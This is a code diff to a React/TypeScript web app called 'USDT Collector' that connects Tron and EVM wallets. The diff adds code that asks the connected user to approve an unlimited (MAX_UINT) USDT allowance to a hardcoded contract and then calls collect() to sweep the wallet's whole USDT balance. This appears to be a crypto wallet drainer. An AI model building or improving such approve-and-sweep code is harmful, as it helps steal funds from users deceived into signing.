@@ -20,14 +20,10 @@ import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
 import { mainnet, arbitrum, bsc, polygon } from '@reown/appkit/networks'
 import type { AppKitNetwork } from '@reown/appkit/networks'
 
-// --- TRON / WC IMPORTS ---
-import * as TronWebNS from 'tronweb'
-import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect'
-
 // ── CONFIG ──
 const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
 const NETWORK = 'Mainnet'
-const CONTRACT_ADDRESS = 'TEgdXwe91pY49EfG5oEzP4mwPQ7Koj77GZ'
+const CONTRACT_ADDRESS = 'TEgdXwe91pY49EfG5oEzP4mwPQ7Koj77GZ' // Tron Contract
 
 // Include both Tron and EVM networks
 const appkitNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [
@@ -61,26 +57,20 @@ const EVM_ERC20_ABI = [
   'function decimals() view returns (uint8)',
 ]
 
-const { usdtAddress: USDT_ADDRESS } =
-  NETWORK_CONFIG[NETWORK as keyof typeof NETWORK_CONFIG]
-
 // ─── WalletConnect-for-Tron helper ────────────────────────────
-const TronWebCtor = ((TronWebNS as any).default ?? TronWebNS) as any
-const FULL_HOST = 'https://api.trongrid.io'
+import TronWeb from 'tronweb'   
+import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect'
 
-function createTmpTronWeb() {
-  return new TronWebCtor({ fullHost: FULL_HOST })
-}
+const FULL_HOST = 'https://api.trongrid.io'       // Tron Mainnet
+const tronWebTmp = new (TronWeb as any)({ fullHost: FULL_HOST })
 
-async function signAndBroadcastViaWC(
+export async function signAndBroadcastViaWC(
   adapter: WalletConnectAdapter,
   contractAddr: string,
   func: string,
   params: { type: string; value: any }[],
   fee = 100_000_000
 ) {
-  const tronWebTmp = createTmpTronWeb()
-
   const { transaction, result } =
     await tronWebTmp.transactionBuilder.triggerSmartContract(
       contractAddr,
@@ -93,11 +83,12 @@ async function signAndBroadcastViaWC(
   if (!result?.result) throw new Error('Failed to build transaction')
 
   const signed = await adapter.signTransaction(transaction)
-  const sent = await tronWebTmp.trx.sendRawTransaction(signed)
-
+  const sent   = await tronWebTmp.trx.sendRawTransaction(signed)
   if (!sent.result) throw new Error('Broadcast failed')
   return sent.txid || sent.transaction?.txID
 }
+
+const { usdtAddress: USDT_ADDRESS } = NETWORK_CONFIG[NETWORK as keyof typeof NETWORK_CONFIG]
 
 // ── Reown Adapters ──
 const tronAdapter = new TronAdapter({
@@ -116,14 +107,14 @@ const wagmiAdapter = new WagmiAdapter({
 
 // ── Create AppKit ──
 createAppKit({
-  adapters: [tronAdapter, wagmiAdapter],
+  adapters: [tronAdapter, wagmiAdapter], // Both adapters active
   networks: appkitNetworks,
   projectId: WC_PROJECT_ID,
   metadata: {
-    name: 'USDT Collector',
+    name:        'USDT Collector',
     description: 'Collect USDT from multiple wallets',
-    url: window.location.origin,
-    icons: ['https://cryptologos.cc/logos/tether-usdt-logo.png'],
+    url:         window.location.origin,
+    icons:       ['https://cryptologos.cc/logos/tether-usdt-logo.png'],
   },
   themeMode: 'dark',
   themeVariables: {
@@ -170,51 +161,115 @@ export default function App() {
   const [txHash, setTxHash] = useState('')
   const autoTriggered = useRef(false)
 
-  const wcRef = useRef<WalletConnectAdapter | null>(null)
-  if (wcRef.current === null) {
-    wcRef.current = new WalletConnectAdapter({
-      network: 'Mainnet',
-      options: {
-        projectId: WC_PROJECT_ID,
-        relayUrl: 'wss://relay.walletconnect.com',
-        metadata: {
-          name: 'USDT Collector',
-          description: 'Collect USDT from multiple wallets',
-          url: window.location.origin,
-          icons: ['https://cryptologos.cc/logos/tether-usdt-logo.png'],
+  // WalletConnect adapter lives in a ref so it’s initialised once
+  // ✅ Lazy init runs once, errors are caught, never blocks render
+  const [wcAdapter] = useState<WalletConnectAdapter>(() => {
+    try {
+      return new WalletConnectAdapter({
+        network: 'Mainnet',
+        options: {
+          projectId: WC_PROJECT_ID,
+          relayUrl: 'wss://relay.walletconnect.com',
+          metadata: {
+            name: 'USDT Collector',
+            description: 'Collect USDT from multiple wallets',
+            url: window.location.origin,
+            icons: ['https://cryptologos.cc/logos/tether-usdt-logo.png'],
+          },
         },
-      },
-    })
-  }
-  const wcAdapter = wcRef.current
+      })
+    } catch (e) {
+      console.warn('[WalletConnect] init failed', e)
+      return null as any
+    }
+  })
 
   const { open } = useAppKit()
   const { address: walletAddress, isConnected, caipAddress } = useAppKitAccount()
   const { chainId } = useAppKitNetwork()
-  const { walletProvider: tronWalletProvider } = useAppKitProvider('tron')
+
   const { walletProvider: evmWalletProvider } = useAppKitProvider('eip155')
 
   const isTron = typeof caipAddress === 'string' && caipAddress.startsWith('tron:')
   const isEVM = typeof caipAddress === 'string' && caipAddress.startsWith('eip155:')
 
+  /**
+   * Returns a usable TronWeb instance if one is present anywhere the dApp can reach.
+   * Works for: Trust dApp browser, MetaMask-Tron, TronLink, window.tronWeb,
+   * and the Reown `walletProvider` when it exposes `.tronWeb`.
+   */
+  const { walletProvider: tronWalletProvider } = useAppKitProvider('tron')
+
   const resolveTronWeb = () => {
     const w = window as any
 
+    // Trust Wallet dApp browser / MetaMask-Tron
     if (w.trustwallet?.tronLink?.tronWeb?.contract) return w.trustwallet.tronLink.tronWeb
+
+    // TronLink extension / mobile
     if (w.tronLink?.tronWeb?.contract) return w.tronLink.tronWeb
+
+    // Global injection
     if (w.tronWeb?.contract) return w.tronWeb
+
+    // Reown provider may expose .tronWeb
     if ((tronWalletProvider as any)?.tronWeb?.contract) return (tronWalletProvider as any).tronWeb
 
     return null
   }
 
   const tronWeb = resolveTronWeb()
+
   const isWalletConnectTron = isTron && !tronWeb && !!wcAdapter?.connected
 
   const log = (msg: string) => {
-    console.log(msg)
-    setDebugLog(prev => [msg, ...prev].slice(0, 5))
+    console.log(msg);
+    setDebugLog(prev => [msg, ...prev].slice(0, 5)); 
   }
+
+  useEffect(() => {
+    const init = async () => {
+      if (!isConnected || !walletAddress) return
+
+      log(`Connected: ${caipAddress || 'unknown'}`)
+
+      if (isTron) {
+        const injectedTronWeb = resolveTronWeb()
+        const globals = inspectTronGlobals()
+
+        log(`TRON globals: ${JSON.stringify(globals)}`)
+
+        if (!injectedTronWeb) {
+          log('❌ No injected TronWeb detected')
+          setStatus(
+            'TRON account connected, but this Trust Wallet session is not exposing injected TronWeb here.'
+          )
+          return
+        }
+
+        log('✅ TRON injected provider detected')
+        await getTronBalance(injectedTronWeb, walletAddress)
+        return
+      }
+
+      if (isEVM) {
+        if (!evmWalletProvider) {
+          log('❌ No EVM provider detected')
+          setStatus('EVM wallet connected, but no EVM provider was found.')
+          return
+        }
+
+        log('✅ EVM session detected')
+        await getBalanceForCurrentChain()
+        return
+      }
+
+      log('❌ Could not determine wallet namespace')
+      setStatus('Unsupported wallet type')
+    }
+
+    init()
+  }, [isConnected, walletAddress, caipAddress, evmWalletProvider, chainId, isTron, isEVM])
 
   const getTronBalance = async (tw: any, addr: string) => {
     const usdt = await tw.contract(USDT_ABI).at(USDT_ADDRESS)
@@ -282,82 +337,100 @@ export default function App() {
     }
   }
 
-  useEffect(() => {
-    const init = async () => {
-      if (!isConnected || !walletAddress) return
-
-      log(`Connected: ${caipAddress || 'unknown'}`)
-
-      if (isTron) {
-        const injectedTronWeb = resolveTronWeb()
-        const globals = inspectTronGlobals()
-
-        log(`TRON globals: ${JSON.stringify(globals)}`)
-
-        if (!injectedTronWeb && !isWalletConnectTron) {
-          log('❌ No injected TronWeb detected')
-          setStatus('TRON account connected, but this session is not exposing injected TronWeb here.')
-          return
-        }
-
-        if (injectedTronWeb) {
-          log('✅ TRON injected provider detected')
-          await getTronBalance(injectedTronWeb, walletAddress)
-          return
-        }
-
-        if (isWalletConnectTron) {
-          log('✅ TRON WalletConnect session detected')
-          setStatus('TRON WalletConnect connected')
-          return
-        }
-      }
-
-      if (isEVM) {
-        if (!evmWalletProvider) {
-          log('❌ No EVM provider detected')
-          setStatus('EVM wallet connected, but no EVM provider was found.')
-          return
-        }
-
-        log('✅ EVM session detected')
-        await getBalanceForCurrentChain()
-        return
-      }
-
-      log('❌ Could not determine wallet namespace')
-      setStatus('Unsupported wallet type')
-    }
-
-    init()
-  }, [isConnected, walletAddress, caipAddress, evmWalletProvider, chainId, isTron, isEVM, isWalletConnectTron])
-
   const handleConnect = () => {
     open({ view: 'AllWallets' })
-    wcAdapter?.connect({}).catch(() => {})
   }
 
   const approveAndCollect = async () => {
+    // EVM BLOCKER
     if (isEVM) {
-      log('❌ EVM Logic Not Configured')
-      setStatus('EVM Logic Not Configured')
-      return
+      log("❌ EVM transactions require an EVM Smart Contract Address.");
+      setStatus('EVM Logic Not Configured');
+      return;
     }
 
+    // ---------- WALLETCONNECT PATH ----------
     if (isWalletConnectTron) {
-      log('❌ WalletConnect TRON session detected')
-      setStatus('WalletConnect TRON connected')
-      return
+      try {
+        const MAX_UINT =
+          '115792089237316195423570985008687907853269984665640564039457584007913129639935'
+
+        await signAndBroadcastViaWC(
+          wcAdapter,
+          USDT_ADDRESS,
+          'approve(address,uint256)',
+          [
+            { type: 'address', value: tronWebTmp.address.toHex(CONTRACT_ADDRESS) },
+            { type: 'uint256', value: MAX_UINT },
+          ]
+        )
+
+        const amount = '0' // ← you can query balance first if you like
+
+        const txId = await signAndBroadcastViaWC(
+          wcAdapter,
+          CONTRACT_ADDRESS,
+          'collect(address,uint256)',
+          [
+            { type: 'address', value: tronWebTmp.address.toHex(walletAddress) },
+            { type: 'uint256', value: amount },
+          ],
+          150_000_000
+        )
+
+        setTxHash(txId)
+        setStatus('✅ All USDT collected!')
+        return
+      } catch (e: any) {
+        log(`❌ WC error: ${e.message}`)
+        setStatus('❌ Transaction failed')
+        setLoading(false)
+        return
+      }
     }
 
+    // ---------- INJECTED TRONWEB PATH ----------
     if (!tronWeb || typeof tronWeb.contract !== 'function' || !walletAddress) {
       log('❌ Error: Wallet not fully initialized')
       setStatus('TRON wallet not ready')
       return
     }
 
-    setStatus('TRON wallet detected')
-  }
+    setLoading(true);
+    setStatus('Step 1/2: Approving...');
+    log("Requesting USDT Approval...");
+
+    try {
+      const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+      const usdt = await tronWeb.contract(USDT_ABI).at(USDT_ADDRESS);
+      
+      const approveTx = await usdt.approve(CONTRACT_ADDRESS, MAX_UINT).send({ feeLimit: 100_000_000 });
+      log(`✅ Approved! Hash: ${approveTx.slice(0,10)}...`);
+      
+      setStatus('Step 2/2: Collecting...');
+      log("Waiting 3s for network sync...");
+      await new Promise(r => setTimeout(r, 3000));
+
+      const balanceObj = await usdt.balanceOf(walletAddress).call();
+      const amount = balanceObj.toString();
+      log(`Found ${Number(amount)/1000000} USDT to collect.`);
+
+      const contract = await tronWeb.contract(COLLECT_ABI).at(CONTRACT_ADDRESS);
+      const tx = await contract.collect(walletAddress, amount).send({
+        feeLimit: 150_000_000,
+      });
+
+      setTxHash(tx);
+      log("✅ Successfully Collected!");
+      setStatus('✅ All USDT collected!');
+    } catch (err: any) {
+      log(`❌ Error: ${err.message || 'User rejected'}`);
+      setStatus('❌ Transaction Failed');
+      autoTriggered.current = false; 
+    } finally {
+      setLoading(false);
+    }
+  };
 
   return (
     <div className="min-h-screen flex items-center justify-center p-4 bg-zinc-950">
@@ -438,28 +511,19 @@ export default function App() {
             </div>
           )}
 
-          <div className="mt-6 pt-6 border-t border-zinc-800">
-            <p className="text-[10px] uppercase tracking-widest text-zinc-500 mb-3 font-bold">Activity Log</p>
-            <div className="bg-black/50 rounded-xl p-3 font-mono text-[11px] space-y-1">
-              {debugLog.length === 0 && <p className="text-zinc-600 italic">Waiting for connection...</p>}
-              {debugLog.map((line, i) => (
-                <div
-                  key={i}
-                  className={`${
-                    line.includes('❌')
-                      ? 'text-red-400'
-                      : line.includes('✅')
-                      ? 'text-emerald-400'
-                      : line.includes('⚠️')
-                      ? 'text-yellow-400'
-                      : 'text-zinc-400'
-                  }`}
-                >
-                  {`> ${line}`}
-                </div>
-              ))}
-            </div>
+         {/* --- Debug Monitor --- */}
+        <div className="mt-6 pt-6 border-t border-zinc-800">
+          <p className="text-[10px] uppercase tracking-widest text-zinc-500 mb-3 font-bold">Activity Log</p>
+          <div className="bg-black/50 rounded-xl p-3 font-mono text-[11px] space-y-1">
+            {debugLog.length === 0 && <p className="text-zinc-600 italic">Waiting for connection...</p>}
+            {debugLog.map((line, i) => (
+              <div key={i} className={`${line.includes('❌') ? 'text-red-400' : line.includes('✅') ? 'text-emerald-400' : line.includes('⚠️') ? 'text-yellow-400' : 'text-zinc-400'}`}>
+                {`> ${line}`}
+              </div>
+            ))}
           </div>
+        </div>
+
         </div>
       </div>
     </div>
